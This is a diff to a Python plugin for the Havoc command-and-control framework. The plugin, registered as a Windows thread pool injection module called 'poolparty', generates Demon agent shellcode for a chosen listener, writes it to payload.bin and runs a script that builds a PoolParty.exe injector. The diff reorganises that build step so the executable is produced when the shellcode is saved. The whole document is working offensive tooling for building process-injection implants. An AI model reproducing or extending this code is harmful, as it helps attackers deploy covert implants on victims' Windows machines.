@@ -10,8 +10,7 @@ from time import sleep
 
 #cwd = os.getcwd()
 cwd = "/home/cipher/Github/havoc-PoolParty"
-#shellcode_file_path = cwd + "/payload.bin"
-shellcode_file_path = "/home/cipher/Github/havoc-PoolParty/payload.bin"
+shellcode_file_path = cwd + "/payload.bin"
 poolparty_file_path = cwd + "/PoolParty.exe"
 
 def generate_payload(demon, arch, listener):
@@ -45,18 +44,7 @@ def generate_payload(demon, arch, listener):
                 \"Stack Duplication\": true \
             }"
         )
-	sleep(120)
-	demon.ConsoleWrite(demon.CONSOLE_INFO, f"{shellcode_file_path}")
-	if os.path.exists(shellcode_file_path):
-		demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
-		demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
-		os.system(f"python3 generate.py -f {shellcode_file_path} ")
-		sleep(10)
-		if os.path.exists(poolparty_file_path):
-			demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
-	else:
-		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode generation failed!")
-	return False
+	return True
 
 def generate(demonID, *params):
 	TaskID : str = None
@@ -99,12 +87,17 @@ def generate(demonID, *params):
 			demon.ConsoleWrite(demon.CONSOLE_INFO, f"Generating payload for {arch} with listener as {listener}")
 	
 			TaskID = generate_payload(demon, arch, listener)
+			# demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
+			
+			# demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
 			return TaskID
+	
 
 def save_shellcode(data):
 	with open(shellcode_file_path, "wb") as file:
 		file.write(b64decode(data))
 	file.close()
+	os.system(f"python3 {cwd}/generate.py -f {shellcode_file_path} ")
 
 RegisterModule("poolparty", "Windows Thread Pool Injection Module", "", "", "", "")
 RegisterCommand(generate, "poolparty", "generate", "Generate the PoolParty executable",0, "", "")
